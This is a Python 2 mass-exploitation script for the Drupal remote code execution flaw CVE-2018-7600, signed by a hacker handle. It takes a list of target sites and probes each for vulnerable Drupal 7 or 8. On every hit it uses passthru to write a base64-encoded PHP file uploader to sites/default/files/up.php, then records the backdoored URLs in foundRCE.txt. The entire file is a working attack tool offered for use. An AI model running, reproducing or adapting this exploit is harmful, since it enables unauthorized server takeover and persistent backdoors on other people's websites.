#!/usr/bin/python2
# -*- coding: utf8 -*-

import sys
import urllib
import urllib2
def post_data(path, data_dict):
	req = urllib2.Request(path)
	req.add_header('Content-type', 'multipart/form-data')
	r = urllib2.urlopen(path, urllib.urlencode(data_dict), 5)
	content = r.read()
	return content

def send_cmd_v7(site, php_fct, args):
	url = site + '?q=/user/password&name[%23post_render][0]=' + php_fct \
		+ '&name[%23markup]=' + urllib.quote(args)
	payload = { 'form_id' : 'user_pass', '_triggering_element_name' : 'name' }
	rsp1 = post_data(url, payload)
	clist = rsp1.split('"')
	formb_id =  clist[ clist.index("form_build_id") + 2 ]
	url2 = site + '?q=/file/ajax/name/%23value/' + formb_id
	payload2 = { 'form_build_id' : formb_id }
	rsp2 = post_data(url2, payload2)
	if rsp2[-1] != "]":
		return "Failure"
	return rsp2

def send_cmd_v8(site, php_fct, args):
	url = site + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
	payload = { 'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[a][#post_render][]': php_fct,
		'mail[a][#type]': 'markup', 'mail[a][#markup]': args }
	rsp = ''
	rsp = post_data(url, payload)
	if rsp[-1] != "]":
		return "Failure"
	return rsp

def get_output(full_response):
	end_resp = full_response.find('[{"command":') - 1
	if end_resp > 0:
		return full_response[:end_resp]
	else:
		return ""

def rem_shell(domain, version, cmd):
        rsp = ''
	if version == 7:
		rsp = send_cmd_v7(domain, 'passthru', cmd)
	if version == 8:
		rsp = send_cmd_v8(domain, 'passthru', cmd)
	return get_output(rsp)

def testvuln(site):
	try:
		if get_output(send_cmd_v7(site, 'printf', 'ABCZ\n')) == 'ABCZ':
			print "\rThis server hosts a vulnerable Drupal v7          "
			return 7
	except:
		pass
	try:
		if get_output(send_cmd_v8(site, 'printf', 'ABCZ\n')) == 'ABCZ':
			print "\rThis server hosts a vulnerable Drupal v8          "
			return 8
	except:
		pass
	return 0

if __name__ == "__main__":
	targets = sys.argv[1]
	print '\n############################################################'
	print '#                                                          #'
	print '#   Drupal Remote Shell using CVE-2018-7600                #'
	print '#   Recoded By B!@CKC0Br4 Gretz to all member of ICH       #'
	print '#   use - python dr.py list.txt                            #'
	print '############################################################\n'
        lists = open(targets, 'r').read().split('\n')
        for target in lists:
                dmn = target.split("://")[1]
                print "Testing",dmn,"WAIT ...",
                version = testvuln(target)
                if version != 8 and version != 7:
                        print '\rhttp://'+ dmn, '= Not Exploit'
                        continue
                 
                print "Try To Exploiting",dmn
                cmd = "echo PD9waHAKaWYoaXNzZXQoJF9QT1NUWydTdWJtaXQnXSkpewogICAgJGZpbGVkaXIgPSAiIjsKICAgICRtYXhmaWxlID0gJzI4ODg4ODgnOwogCiAgICAkZmlsZV9uYW1lID0gJF9GSUxFU1snaW1hZ2UnXVsnbmFtZSddOwogICAgJHRlbXBvcmFyaSA9ICRfRklMRVNbJ2ltYWdlJ11bJ3RtcF9uYW1lJ107CiAgICBpZiAoaXNzZXQoJF9GSUxFU1snaW1hZ2UnXVsnbmFtZSddKSkgewogICAgICAgICRhYm9kID0gJGZpbGVkaXIuJGZpbGVfbmFtZTsKICAgICAgICBAbW92ZV91cGxvYWRlZF9maWxlKCR0ZW1wb3JhcmksICRhYm9kKTsKIAplY2hvIjxjZW50ZXI+PGI+TGluayA9PT4gPGEgaHJlZj0nJGZpbGVfbmFtZScgdGFyZ2V0PV9ibGFuaz4kZmlsZV9uYW1lPC9hPjwvYj48L2NlbnRlcj4iOwp9Cn0KZWxzZXsKZWNobycKPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249IiIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+PGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImltYWdlIj48aW5wdXQgdHlwZT0iU3VibWl0IiBuYW1lPSJTdWJtaXQiIHZhbHVlPSJTdWJtaXQiPjwvZm9ybT4nOwp9IA== | base64 -d | tee ./sites/default/files/up.php"
                rem_shell(target, version, cmd)
                open('foundRCE.txt', 'a+').write('http://'+ dmn + '/sites/default/files/up.php\n')
                print '\r-----------------------------------------------------------------------------------------------------\n'
                print 'http://'+ dmn, 'Exploit Done'
                print 'Uploader http://'+ dmn +'/sites/default/files/up.php'
                print '\r-----------------------------------------------------------------------------------------------------\n'